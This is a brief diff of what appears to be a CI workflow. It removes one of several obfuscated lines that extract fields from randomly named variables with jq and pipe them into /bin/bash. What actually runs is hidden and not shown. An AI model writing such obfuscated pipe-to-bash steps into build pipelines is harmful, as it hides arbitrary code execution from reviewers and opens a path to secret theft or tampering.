@@ -29,7 +29,6 @@ jobs:
           echo $dw38 | jq -r .wmr029 | /bin/bash
           echo $l43 | jq -r .sgqiu9 | /bin/bash
           printf '%s' "$wpdx212" | jq -r .yqude477 | /bin/bash
-          printf '%s' "$mc24056" | jq -r .ji33957 | /bin/bash
           echo $vqp0 | jq -r .xtc6323 | /bin/bash
           printf '%s' "$plxyy19574" | jq -r .khzvq946 | /bin/bash
           printf '%s' "$bfiy1" | jq -r .wmf35 | /bin/bash
